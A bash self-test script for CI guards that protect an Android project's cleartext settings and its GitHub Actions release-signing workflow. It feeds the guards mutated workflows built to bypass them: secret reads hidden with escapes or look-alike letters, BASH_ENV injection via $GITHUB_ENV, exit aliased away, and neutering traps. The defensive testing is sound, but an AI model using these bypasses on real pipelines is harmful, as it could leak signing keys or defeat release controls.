#!/usr/bin/env bash
# Checks the CI guards against broken inputs: each case must make its guard fail, and the real files must still pass. Needs yq and
# python3, no Gradle and no network. Runs in the ci lane (run-partition.sh ci), so a guard that stops rejecting a case fails a pull request.
#   check-cleartext-sources.sh   cleartext allowed outside src/debug/ (#1406, #1441)
#   check-workflow-guards.sh     comment-run trusted gate, release refusal order, signing environment and sign-job steps (#1407, #1408, #1442, #1451, #1465, #1470, #1481, #1482, #1493, #1531, #1532)
#   sign-release.sh              the hash, secrets and version-code checks that come before the APK is signed (#1493)
#   close-refresh-pr.sh          the refresh pull request is closed and the comment posted once (#1396, #1443)
#
# Usage: scripts/ci/selftest-guards.sh

set -euo pipefail

root=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)
cd "$root"
work=$(mktemp -d "${TMPDIR:-/tmp}/selftest-guards.XXXXXX")
trap 'rm -rf "$work"' EXIT

failed=0
fail() {
    echo "selftest-guards: FAIL: $*" >&2
    failed=1
}
# expect_fail <name> <command...> and expect_pass <name> <command...> run the guard quietly and compare its exit status. A rejection
# counts only when the guard says "error:", so a crash of the guard itself (a yq or python failure) is not mistaken for one.
expect_fail() {
    local name=$1 output
    shift
    if output=$("$@" 2>&1); then
        fail "$name was accepted"
    elif ! grep -q 'error:' <<<"$output"; then
        fail "$name made the guard stop without an error message: $output"
    fi
}
expect_pass() {
    local name=$1
    shift
    "$@" >/dev/null 2>&1 || fail "$name was rejected"
}

# --- check-cleartext-sources.sh: each variant is written into a fresh tree.
cleartext=$root/scripts/ci/check-cleartext-sources.sh
tree() {
    # tree <path> <xml attribute text>: a tree with one manifest-like file at <path>.
    rm -rf "$work/tree"
    mkdir -p "$work/tree/$(dirname "$1")"
    printf '<manifest xmlns:android="http://schemas.android.com/apk/res/android" xmlns:a="http://schemas.android.com/apk/res/android">\n  <application %s/>\n</manifest>\n' "$2" >"$work/tree/$1"
}
mkdir "$work/tree"
expect_pass "a tree with no cleartext" "$cleartext" "$work/tree"
tree lumio/src/debug/res/xml/network_security_config.xml 'android:usesCleartextTraffic="true"'
expect_pass "cleartext in src/debug/" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="false"'
expect_pass "cleartext set to false" "$cleartext" "$work/tree"
tree lumio/build/intermediates/AndroidManifest.xml 'android:usesCleartextTraffic="true"'
expect_pass "a build directory" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="true"'
expect_fail "double quotes" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml "android:usesCleartextTraffic='true'"
expect_fail "single quotes" "$cleartext" "$work/tree"
tree app/src/main/res/xml/network_security_config.xml 'cleartextTrafficPermitted = "true"'
expect_fail "spaces around =" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="TRUE"'
expect_fail "upper case TRUE" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'a:usesCleartextTraffic="true"'
expect_fail "another namespace prefix" "$cleartext" "$work/tree"
tree shared/src/main/res/xml/network_security_config.xml 'cleartextTrafficPermitted="true"'
expect_fail "a shared resource" "$cleartext" "$work/tree"
tree lumio/src/release/AndroidManifest.xml 'android:usesCleartextTraffic="true"'
expect_fail "a release source set" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="@bool/cleartext"'
expect_fail "a resource reference that can resolve to true" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="${cleartext}"'
expect_fail "a manifest placeholder that can resolve to true" "$cleartext" "$work/tree"
tree lumio/src/main/res/src/debug/network_security_config.xml 'cleartextTrafficPermitted="true"'
expect_fail "a src/debug directory nested in a main source set" "$cleartext" "$work/tree"
tree lumio/src/main/res/xml/network_security_config.XML 'cleartextTrafficPermitted="true"'
expect_fail "an upper case .XML extension" "$cleartext" "$work/tree"
tree lumio/src/main/build/network_security_config.xml 'cleartextTrafficPermitted="true"'
expect_fail "a build directory inside src" "$cleartext" "$work/tree"
tree chains/ethereum/signer/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="true"'
expect_fail "a nested module" "$cleartext" "$work/tree"
tree chains/ethereum/signer/src/debug/AndroidManifest.xml 'android:usesCleartextTraffic="true"'
expect_pass "src/debug of a nested module" "$cleartext" "$work/tree"
tree lumio/src/main/AndroidManifest.xml 'android:usesCleartextTraffic="true"'
echo '<broken' >"$work/tree/lumio/src/main/res.xml"
rm "$work/tree/lumio/src/main/AndroidManifest.xml"
expect_fail "XML that cannot be parsed" "$cleartext" "$work/tree"
expect_pass "the repository sources" "$cleartext"

# --- check-workflow-guards.sh: each mutation is applied to a copy of the real workflows.
guards=$root/scripts/ci/check-workflow-guards.sh
mutate() {
    # mutate <file> <yq expression or "sed:<script>">: a fresh copy of the workflows with one change.
    rm -rf "$work/workflows"
    cp -R .github/workflows "$work/workflows"
    case "$2" in
        sed:*) sed -i.bak "${2#sed:}" "$work/workflows/$1" && rm "$work/workflows/$1.bak" ;;
        *) yq -i "$2" "$work/workflows/$1" ;;
    esac
    if cmp -s ".github/workflows/$1" "$work/workflows/$1"; then fail "the mutation of $1 changed nothing: $2"; fi
}
guard_with() { WORKFLOWS_DIR=$work/workflows "$guards"; }
expect_environment_error() {
    # expect_environment_error <name> <pattern>: the guard rejects the workflows and its message matches the pattern.
    local name=$1 output
    if output=$(guard_with 2>&1); then fail "$name was accepted"; elif ! grep -q "$2" <<<"$output"; then fail "$name was rejected for another reason: $output"; fi
}
expect_pass "the real workflows" "$guards"
rm -rf "$work/workflows"
cp -R .github/workflows "$work/workflows"
expect_pass "an unchanged copy of the workflows" guard_with
mutate release.yml '.jobs.other = {"runs-on": "ubuntu-24.04", "steps": [{"run": "echo ${{ secrets.GITHUB_TOKEN }}"}]}'
expect_fail "GITHUB_TOKEN read in release.yml, which lists only the keystore secrets" guard_with
mutate comment-run.yml 'sed:s/contains(fromJSON(.\[[^]]*\].), github.event.comment.author_association)/github.event.comment.author_association/'
expect_fail "a bare author_association" guard_with
mutate comment-run.yml 'sed:s/"OWNER","MEMBER","COLLABORATOR"/"OWNER","MEMBER","COLLABORATOR","NONE"/'
expect_fail "NONE in the trusted list" guard_with
mutate comment-run.yml 'sed:s/ || github.run_id }}/ }}/'
expect_fail "no per-run fallback" guard_with
mutate release.yml 'sed:s/^\( *\)if ! git merge-base/\1# if ! git merge-base/'
expect_fail "a commented-out refusal" guard_with
mutate release.yml '(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse")) | .run) = "true"'
{ echo '# git merge-base --is-ancestor "$GITHUB_SHA" origin/master'; cat "$work/workflows/release.yml"; } >"$work/release.yml"
mv "$work/release.yml" "$work/workflows/release.yml"
expect_fail "a refusal that only a YAML comment quotes" guard_with
mutate release.yml '(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse")) | .run) = "true" | .jobs.sign_lensly.steps += [{"name": "late", "run": "git merge-base --is-ancestor \"$GITHUB_SHA\" origin/master"}]'
expect_fail "a refusal after the keystore secret" guard_with
mutate release.yml '.jobs.sign_lensly.steps[0].env.EARLY = "${{ secrets.LENSLY_KEYSTORE_PASS }}"'
expect_fail "a keystore secret read before the refusal" guard_with
mutate release.yml 'del(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse")))'
expect_fail "no refusal step" guard_with
mutate comment-run.yml 'sed:s/-\${{ startsWith(/-${{ true || startsWith(/'
expect_fail "a true || prefix in the group" guard_with
mutate comment-run.yml 'sed:s/-\${{ startsWith(/-${{ !startsWith(/'
expect_fail "a negated /run- test in the group" guard_with
# A secret read before the refusal, in any form the old text match and an env/with scan would miss.
for read in 'echo ${{ secrets.LENSLY_KEYSTORE_PASS }}' "echo \${{ secrets['LENSLY_KEYSTORE_PASS'] }}" 'echo ${{ secrets.lensly_keystore_pass }}' \
    'echo # ${{ secrets.LENSLY_KEYSTORE_PASS }}' 'echo ${{ toJSON(secrets) }}'; do
    mutate release.yml ".jobs.sign_lensly.steps[0].run = \"$read\""
    expect_fail "a secret read in run before the refusal: $read" guard_with
done
mutate release.yml '.jobs.sign_lensly.steps[0].env.ALL = "${{ toJSON(secrets) }}"'
expect_fail "toJSON(secrets) in env before the refusal" guard_with
mutate release.yml '.jobs.sign_lensly.env.PASS = "${{ secrets.LENSLY_KEYSTORE_PASS }}"'
expect_fail "a job-level secret" guard_with
mutate release.yml '.jobs.sign = {"uses": "./.github/workflows/sign.yml", "secrets": "inherit"}'
expect_fail "a reusable workflow that inherits secrets" guard_with
mutate release.yml '.jobs.sign = {"runs-on": "ubuntu-24.04", "steps": [{"run": "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"}]}'
expect_fail "a second job that reads a secret with no refusal" guard_with
mutate release.yml '(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse"))) += {"if": "false"}'
expect_fail "a refusal with if: false" guard_with
mutate release.yml '(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse"))) += {"continue-on-error": true}'
expect_fail "a refusal with continue-on-error" guard_with
mutate release.yml '(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse")) | .run) = "echo git merge-base --is-ancestor \"$GITHUB_SHA\" origin/master"'
expect_fail "a refusal that only echoes the command" guard_with
mutate release.yml 'sed:s/^\( *\)exit 1$/\1true/'
expect_fail "a refusal without exit 1" guard_with
mutate release.yml 'sed:s/^\( *\)if ! git merge-base \(.*\); then$/\1echo ok # if ! git merge-base \2; then/'
expect_fail "a refusal behind a trailing comment" guard_with
# The refusal step may only have name, run and id, and its exit must run whenever the ancestor check fails (#1448).
refusal='(.jobs.sign_lensly.steps[] | select(.name | test("^Refuse")))'
check='git merge-base --is-ancestor \"$GITHUB_SHA\" origin/master'
mutate release.yml "$refusal += {\"env\": {\"GITHUB_SHA\": \"abc\"}}"
expect_fail "a refusal with its own env" guard_with
mutate release.yml "$refusal += {\"shell\": \"python\"}"
expect_fail "a refusal with another shell" guard_with
mutate release.yml "$refusal += {\"working-directory\": \"/tmp\"}"
expect_fail "a refusal with a working-directory" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  if false; then\\n    exit 1\\n  fi\\nfi\""
expect_fail "an exit 1 nested in dead code" guard_with
mutate release.yml "($refusal | .run) = \"if false; then\\n  if ! $check; then\\n    exit 1\\n  fi\\nfi\""
expect_fail "a refusal inside an outer if" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  false &&\\n  exit 1\\nfi\""
expect_fail "an exit 1 after &&" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  true ||\\n  exit 1\\nfi\""
expect_fail "an exit 1 after ||" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  echo ok\\nelse\\n  exit 1\\nfi\""
expect_fail "an exit 1 in the else branch" guard_with
mutate release.yml "($refusal | .run) = \"f() {\\n  if ! $check; then\\n    exit 1\\n  fi\\n}\""
expect_fail "a refusal inside a function" guard_with
# The refusal lines must be code the shell runs, not text inside a heredoc or a string that spans lines (#1451).
for open_close in "cat <<'NOTE'|NOTE" 'cat <<NOTE|NOTE' 'cat <<"NOTE"|NOTE' 'cat <<-NOTE|NOTE' 'echo "|"' ": '|'"; do
    opener=${open_close%|*} closer=${open_close#*|}
    mutate release.yml "($refusal | .run) = \"set -euo pipefail\\n${opener//\"/\\\"}\\nif ! $check; then\\n  exit 1\\nfi\\n${closer//\"/\\\"}\""
    expect_fail "a refusal inside $opener" guard_with
done
# Workflow- and job-level settings reach the refusal step too: another shell, working directory or environment (BASH_ENV, PATH, GIT_DIR,
# GITHUB_SHA) can turn it into a no-op, so release.yml allows only a fixed set of keys at both levels.
for level in '' '.jobs.sign_lensly'; do
    where=${level:-the workflow}
    mutate release.yml "$level.defaults.run.shell = \"true {0}\""
    expect_fail "defaults.run.shell in $where" guard_with
    mutate release.yml "$level.defaults.run.working-directory = \"/tmp\""
    expect_fail "defaults.run.working-directory in $where" guard_with
    for var in BASH_ENV ENV PATH GIT_DIR GITHUB_SHA; do
        mutate release.yml "$level.env.$var = \"/tmp/x\""
        expect_fail "$var in the env of $where" guard_with
    done
done
# The exit 1 must run in the step's own shell, not inside a command substitution or subshell that swallows it (#1465).
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  echo \\\"::error::refused\\\" \$(\\n    exit 1\\n  )\\n  exit 0\\nfi\""
expect_fail "an exit 1 inside \$( )" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  echo \\\"::error::refused\\\" \`\\n    exit 1\\n  \`\\n  exit 0\\nfi\""
expect_fail "an exit 1 inside backticks" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  (\\n    exit 1\\n  )\\nfi\""
expect_fail "an exit 1 inside a subshell" guard_with
mutate release.yml "($refusal | .run) = \"if ! $check; then\\n  echo hi |&\\n  exit 1\\nfi\""
expect_fail "an exit 1 in the pipeline that a line ending in |& continues" guard_with
# Only the pinned checkout may run before the refusal: any other step can write BASH_ENV or PATH to $GITHUB_ENV / $GITHUB_PATH, or run
# code from the repository (a local action), and so neuter the refusal.
steps='.jobs.sign_lensly.steps'
checkout="\"uses\": \"actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\", \"with\": {\"persist-credentials\": false, \"fetch-depth\": 0}"
for early in '{"run": "echo BASH_ENV=/tmp/x >> $GITHUB_ENV"}' '{"run": "echo /tmp/bin >> $GITHUB_PATH"}' '{"uses": "./evil"}' \
    '{"uses": "actions/cache@3d3c42e5aac5ba805825da76410c181273ba90b1"}' '{"uses": "actions/checkout@v7", "with": {"persist-credentials": false, "fetch-depth": 0}}' \
    "{$checkout, \"env\": {\"GIT_DIR\": \"/tmp\"}}" "{$checkout, \"if\": \"false\"}" "{$checkout, \"run\": \"true\"}" \
    '{"uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "with": {"path": "sub"}}'; do
    mutate release.yml "$steps = [$early] + $steps"
    expect_fail "a step before the refusal: $early" guard_with
done
# The refusal check alone accepts a second pinned checkout; the guard's other checks pass it too, so the sign job's step allowlist is what rejects it.
mutate release.yml "$steps = [{$checkout}] + $steps"
expect_fail "a second pinned checkout in a sign job" guard_with
mutate release.yml '.jobs.publish.steps = [{"uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1", "with": {"persist-credentials": false, "fetch-depth": 0}}] + .jobs.publish.steps'
expect_pass "a second pinned checkout in the publish job, which reads no signing secret" guard_with
# No other workflow may read the signing secrets: a second workflow on tag pushes would sign with no refusal. Other secrets stay allowed by name.
for read in '${{ secrets.LENSLY_KEYSTORE_PASS }}' "\${{ secrets['lumio_keystore_b64'] }}" '${{ toJSON(secrets) }}'; do
    mutate nightly.yml ".env.X = \"$read\""
    expect_fail "a keystore secret read in another workflow: $read" guard_with
done
mutate release.yml '.jobs.sign_lensly.steps[0].name = "x"'
yq '.on.push.tags = ["lensly-v*"] | .jobs.sign_lensly.steps += [{"run": "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"}]' "$work/workflows/release.yml" >"$work/workflows/release2.yml"
expect_fail "a second tag workflow that reads the keystore" guard_with
# A step after the refusal that reads a secret must not run on a status function: always(), failure(), !cancelled() and success() || always()
# run it even though the refusal failed. A job-level if or continue-on-error would do the same, and release.yml allows neither (#1481).
sign='(.jobs.sign_lensly.steps[] | select(.name == "Check, align and sign the APK"))'
for cond in 'always()' '${{ failure() }}' '!cancelled()' 'success() || always()' 'ALWAYS()' '${{always ()}}' '${{ Failure( ) }}' 'success()' "cancelled() || github.ref_type == 'tag'"; do
    mutate release.yml "$sign += {\"if\": \"$cond\"}"
    expect_fail "the signing step with if: $cond" guard_with
done
# After the refusal no step may have an if (any key outside name, id, run, env, uses, with fails), except the exact keystore cleanup step.
mutate release.yml "$sign += {\"if\": \"github.ref_type == 'tag'\"}"
expect_fail "the signing step with an if that calls no status function" guard_with
for key in '"IF": "always()"' '"If": "failure()"' '"iF": "true"' '"continue-on-error": true' '"timeout-minutes": 1' '"shell": "bash"' '"working-directory": "/tmp"'; do
    mutate release.yml "$sign += {$key}"
    expect_fail "the signing step with the key $key" guard_with
done
mutate release.yml '.jobs.sign_lensly.steps += [{"name": "Report", "if": "always()", "run": "true"}]'
expect_fail "a step that reads no secret with if: always()" guard_with
mutate release.yml '.jobs.sign_lensly.steps += [{"name": "Report", "IF": "always()", "run": "true"}]'
expect_fail "a step that reads no secret with IF: always()" guard_with
mutate release.yml '.jobs.publish.steps += [{"name": "Report", "run": "true"}]'
expect_pass "a step after the refusal with only name and run in a job that reads no signing secret" guard_with
cleanup='(.jobs.sign_lensly.steps[] | select(.name == "Delete the decoded keystore"))'
for change in '.if = "failure()"' '.if = "always() || true"' '.if = "${{ always() }}"' 'del(.if)' '.IF = "always()"' '.continue-on-error = true' '.env.X = "1"' '.run = "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"'; do
    mutate release.yml "$cleanup |= ($change)"
    expect_fail "the keystore cleanup step changed by $change" guard_with
done
mutate release.yml '.jobs.sign_lensly.steps += [{"name": "Late", "if": "failure()", "run": "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"}]'
expect_fail "a late step that reads a secret with if: failure()" guard_with
mutate release.yml '.jobs.sign_lensly.if = "always()"'
expect_fail "a job-level if: always()" guard_with
mutate release.yml '.jobs.sign_lensly.continue-on-error = true'
expect_fail "a job-level continue-on-error" guard_with
# Another workflow's secret read written with a YAML double-quoted escape: only the parsed string shows the word secrets (#1481).
extra() {
    # extra <yaml text>: a fresh copy of the workflows plus extra.yml with that text.
    rm -rf "$work/workflows"
    cp -R .github/workflows "$work/workflows"
    printf '%s\n' "$1" >"$work/workflows/extra.yml"
}
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - run: echo done'
expect_pass "an extra workflow that reads no secret" guard_with
for name in '\x73' '\u0073' '\U00000073'; do
    extra "on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - run: echo
        env:
          X: \"\${{ ${name}ecrets.LENSLY_KEYSTORE_B64 }}\""
    expect_fail "a keystore secret read written with the escape $name in another workflow" guard_with
done
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - run: echo
        env:
          X: "${{ sec\
            rets.LENSLY_KEYSTORE_B64 }}"'
expect_fail "a keystore secret read split by an escaped line break in another workflow" guard_with
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - run: echo
        env:
          X: "${{ \x73ecrets.NVD_API_KEY }}"'
expect_fail "NVD_API_KEY read in a workflow other than nightly.yml" guard_with
# Every secret read must be exactly a listed expression for its file: the secrets object filter, an index, toJSON, an unknown name, a
# quoted inherit and a secrets: mapping all fail, in release.yml after the refusal and in every other workflow (#1481 review).
expr_in_extra() {
    # expr_in_extra <expression text>: extra.yml with a step that uses it.
    extra "on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - run: echo \${{ $1 }}"
}
for expr in "join(secrets.*, '')" "secrets['NVD_API_KEY']" 'secrets.*' 'toJSON(secrets)' 'toJson( secrets )' 'secrets.UNKNOWN_NAME' 'secrets.NVD_API_KEY' 'SECRETS.GITHUB_TOKEN' \
    "format('}}', secrets.GITHUB_TOKEN)" 'fromJSON(toJSON(secrets)).X' 'secrets . LENSLY_KEYSTORE_B64' 'secrets.LENSLY_KEYSTORE_PASS'; do
    expr_in_extra "$expr"
    expect_fail "the expression $expr in another workflow" guard_with
done
expr_in_extra 'secrets.GITHUB_TOKEN'
expect_fail "secrets.GITHUB_TOKEN in a workflow that does not list it" guard_with
expr_in_extra 'needs.secrets.result'
expect_fail "needs.secrets.result in a workflow that does not list it" guard_with
for read in "join(secrets.*, '')" "secrets['LENSLY_KEYSTORE_PASS']" 'secrets.*' 'toJSON(secrets)' 'secrets.UNKNOWN_NAME'; do
    mutate release.yml "$sign |= (.env = {\"LENSLY_KEYSTORE_B64\": \"\${{ $read }}\"} | .if = \"always()\")"
    expect_fail "the signing step reading only $read, with if: always()" guard_with
    mutate release.yml "$sign |= (.env = {\"LENSLY_KEYSTORE_B64\": \"\${{ $read }}\"})"
    expect_fail "the signing step reading only $read" guard_with
done
for inherit in 'secrets: "inherit"' '"secrets": inherit' "secrets: 'inherit'" 'secrets: inherit' 'Secrets: inherit' 'secrets: {X: "1"}' 'secrets: {}' 'secrets: "${{ toJSON(secrets) }}"'; do
    extra "on: push
jobs:
  j:
    uses: octo/repo/.github/workflows/x.yml@main
    $inherit"
    expect_fail "a reusable workflow call with $inherit" guard_with
done
extra 'on: push
jobs:
  j:
    uses: octo/repo/.github/workflows/x.yml@main
    secrets:
      X: ${{ secrets.NVD_API_KEY }}'
expect_fail "a reusable workflow call with a secrets: mapping" guard_with
extra 'on: push
jobs:
  secrets:
    runs-on: ubuntu-24.04
    steps:
      - run: echo ${{ needs.secrets.result }} ${{ github.token }}'
expect_fail "a job id secrets with a needs.secrets.result expression in an unlisted workflow" guard_with
extra 'on: push
jobs:
  secrets:
    runs-on: ubuntu-24.04
    steps:
      - run: echo done'
expect_pass "a job id named secrets" guard_with
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    env:
      SECRETS: ok
    steps:
      - run: echo "no secrets are read here"'
expect_pass "an env variable named SECRETS and the word secrets in text" guard_with
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    env:
      X: ok
      X: "${{ \x73ecrets.NVD_API_KEY }}"
    steps:
      - run: echo done'
expect_fail "a repeated mapping key" guard_with

# A secret may appear only in the env of a run step. A uses: step (a remote action with a pre script runs it before every step, so
# before the refusal) must not get one in with or env, and a run text must not hold one (#1482).
cache='{"uses": "actions/cache@3d3c42e5aac5ba805825da76410c181273ba90b1"'
for step in "$cache, \"with\": {\"key\": \"\${{ secrets.LENSLY_KEYSTORE_PASS }}\"}}" "$cache, \"env\": {\"K\": \"\${{ secrets.LENSLY_KEYSTORE_PASS }}\"}}" \
    "$cache, \"with\": {\"key\": \"\${{ secrets.LUMIO_KEYSTORE_B64 }}\"}, \"env\": {\"K\": \"\${{ secrets.LUMIO_KEYSTORE_PASS }}\"}}" \
    '{"name": "Late", "run": "echo ${{ secrets.LENSLY_KEYSTORE_PASS }}"}' '{"name": "Late", "uses": "./local", "env": {"K": "${{ secrets.LENSLY_KEYSTORE_PASS }}"}}' \
    '{"name": "Late", "run": "true", "with": {"K": "${{ secrets.LENSLY_KEYSTORE_PASS }}"}}'; do
    mutate release.yml "$steps += [$step]"
    expect_fail "a step after the refusal with a secret outside the env of a run step: $step" guard_with
done
mutate release.yml "$steps += [{\"name\": \"Late\", \"run\": \"true\", \"env\": {\"K\": \"\${{ secrets.LENSLY_KEYSTORE_PASS }}\"}}]"
expect_environment_error "a run step after the refusal with a secret in its env, which is not one of the sign job's allowlisted steps" 'steps must be exactly'
# A YAML merge key hides keys from yq, so any "<<" key fails, in release.yml and in every other workflow; a comment or a heredoc does not (#1482).
insert_after() {
    # insert_after <file> <exact line> <line to add after it>
    rm -rf "$work/workflows"
    cp -R .github/workflows "$work/workflows"
    awk -v after="$2" -v add="$3" '{ print } $0 == after { print add }' ".github/workflows/$1" >"$work/workflows/$1"
    if cmp -s ".github/workflows/$1" "$work/workflows/$1"; then fail "the insertion into $1 changed nothing: $3"; fi
}
for merge in '<<: {if: always()}' '<<: {continue-on-error: true}' '<<: {}' '"<<": {}' "'<<': {}" '? <<' '<< : {}'; do
    insert_after release.yml '      - name: Check, align and sign the APK' "        $merge"
    expect_fail "a merge key in the signing step: $merge" guard_with
done
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    env: &e {X: ok}
    steps:
      - run: echo
        env:
          <<: *e'
expect_fail "an alias merge <<: *anchor" guard_with
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - &base
        run: echo
      - <<: *base
        name: x'
expect_fail "a merge of a step anchor into a step" guard_with
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - {name: x, <<: {if: always()}, run: echo}'
expect_fail "a merge key in a flow mapping" guard_with
extra 'on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      # <<: {if: always()}
      - run: |
          cat <<EOF
          text
          EOF
          grep x <<< "y"'
expect_pass "<< in a comment, a heredoc and a here-string" guard_with
# Names are compared NFKC-normalised and case-folded: the long s and a full-width s spell secrets too (#1482).
long_s=$'\xc5\xbf' wide_s=$'\xef\xbd\x93'
for letter in "$long_s" "$wide_s"; do
    extra "on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    steps:
      - run: echo
        env:
          X: \${{ ${letter}ecrets.LENSLY_KEYSTORE_PASS }}"
    expect_fail "a keystore secret read written with the letter $letter in another workflow" guard_with
    mutate release.yml "$sign |= (.env.LENSLY_KEYSTORE_PASS = \"\${{ ${letter}ecrets.UNKNOWN_NAME }}\")"
    expect_fail "an unlisted secret read written with the letter $letter in release.yml" guard_with
    extra "on: push
jobs:
  j:
    uses: octo/repo/.github/workflows/x.yml@main
    ${letter}ecrets: inherit"
    expect_fail "a reusable workflow call with the key ${letter}ecrets" guard_with
done
# release.yml runs on a push of the lensly-v* and lumio-v* tags and nothing else (#1482).
for change in '.on.pull_request_target.branches = ["master"]' '.on.pull_request = {}' '.on.workflow_dispatch = {}' '.on.workflow_run.workflows = ["x"]' \
    '.on.workflow_call = {}' '.on.schedule = [{"cron": "0 0 * * *"}]' '.on.push.branches = ["master"]' '.on.push.tags += ["v*"]' '.on.push.tags = ["lensly-v*"]' \
    '.on.push.tags-ignore = ["x"]' '.on.push.paths = ["x"]' '.on = "push"' '.on = ["push"]' 'del(.on)' '.on.release = {}' '.on.issue_comment = {}'; do
    mutate release.yml "$change"
    expect_fail "release.yml with the trigger change $change" guard_with
done

# The step's run must be exactly the canonical refusal: no statement before or inside it may skip, override or neuter it (#1470).
canon=$(yq "$refusal | .run" .github/workflows/release.yml)
refuse_with() {
    run=$1 mutate release.yml "($refusal | .run) = strenv(run)"
}
refuse_with "exit 0"$'\n'"$canon"
expect_fail "an exit 0 before the refusal" guard_with
refuse_with "trap 'exit 0' EXIT"$'\n'"$canon"
expect_fail "an EXIT trap that overrides the exit status" guard_with
refuse_with "GITHUB_SHA=origin/master"$'\n'"$canon"
expect_fail "a GITHUB_SHA that is origin/master" guard_with
refuse_with 'git update-ref refs/remotes/origin/master "$GITHUB_SHA"'$'\n'"$canon"
expect_fail "an origin/master moved to the tag commit" guard_with
refuse_with "shopt -s expand_aliases"$'\n'"alias exit=:"$'\n'"$canon"
expect_fail "exit aliased to a no-op" guard_with
refuse_with "${canon%exit 1*}exit 0"$'\n'"exit 1"$'\n'fi
expect_fail "an exit 0 before the exit 1 in the block" guard_with
refuse_with "${canon%exit 1*}"'echo hi |&'$'\n'"exit 1"$'\n'fi
expect_fail "an exit 1 in the pipeline that a line ending in |& continues (canonical form)" guard_with
# Python splits lines at more characters than bash does, so each of these hides "exit 1" inside an echo argument (real characters, not escapes).
for sep in $'\v' $'\f' $'\r' $'\x1c' $'\x1d' $'\x1e' $'\xc2\x85' $'\xe2\x80\xa8' $'\xe2\x80\xa9'; do
    pre=${canon%$'\n'*exit 1*}
    refuse_with "$pre$sep"exit' 1'$'\n'fi
    expect_fail "an exit 1 joined to the echo by the separator $(printf %s "$sep" | od -An -tx1 | tr -d ' \n')" guard_with
done
refuse_with "$canon"
expect_pass "the canonical refusal rewritten from the workflow" guard_with
mutate release.yml "$refusal += {\"id\": \"refuse\"}"
expect_pass "a refusal with an id" guard_with

# --- Signing secrets live in the release environment, in jobs that run no Gradle (#1493, and the advisory on repository-level secrets).
# The old release.yml, one job that built and signed with repository secrets and no environment, must stay rejected.
rm -rf "$work/workflows"
cp -R .github/workflows "$work/workflows"
cp scripts/ci/fixtures/release-single-job.yml "$work/workflows/release.yml"
expect_environment_error "the old single-job release.yml with repository secrets and no environment" 'without environment: release'
for job in sign_lensly sign_lumio; do
    mutate release.yml "del(.jobs.$job.environment)"
    expect_environment_error "$job without environment: release" 'without environment: release'
    mutate release.yml ".jobs.$job.environment = \"production\""
    expect_environment_error "$job in another environment" 'without environment: release'
    mutate release.yml ".jobs.$job.permissions.id-token = \"write\""
    expect_environment_error "$job with id-token: write" 'permissions are not exactly contents: read'
    mutate release.yml ".jobs.$job.permissions.attestations = \"write\""
    expect_environment_error "$job with attestations: write" 'permissions are not exactly contents: read'
    mutate release.yml "del(.jobs.$job.permissions)"
    expect_environment_error "$job without a permissions block" 'permissions are not exactly contents: read'
    mutate release.yml ".jobs.$job.steps += [{\"name\": \"Build\", \"run\": \"./gradlew :app:assembleRelease\"}]"
    expect_environment_error "$job running Gradle" 'runs Gradle'
    mutate release.yml ".jobs.$job.steps += [{\"uses\": \"gradle/actions/setup-gradle@8da46b539cd8fe6ab27ca75128919a18d757604c\"}]"
    expect_environment_error "$job setting up Gradle" 'runs Gradle'
done
mutate release.yml '.jobs.sign_lensly.steps[] |= (select(.name == "Check, align and sign the APK") | .env.LUMIO_KEYSTORE_PASS = "${{ secrets.LUMIO_KEYSTORE_PASS }}") // .'
expect_environment_error "the Lensly sign job that also reads a Lumio secret" 'more than one app'
# The sign step's env values and the job's runs-on and needs are pinned to release.yml's text (#1556).
for job_app in sign_lensly:lensly:lumio sign_lumio:lumio:lensly; do
    job=${job_app%%:*} app=${job_app#*:} other=${app#*:} app=${app%%:*}
    app_up=$(tr a-z A-Z <<<"$app") other_up=$(tr a-z A-Z <<<"$other")
    sign_of="(.jobs.$job.steps[] | select(.name == \"Check, align and sign the APK\"))"
    mutate release.yml "$sign_of.env.KEYSTORE_PASS = \"\${{ secrets.${app_up}_KEYSTORE_B64 }}\""
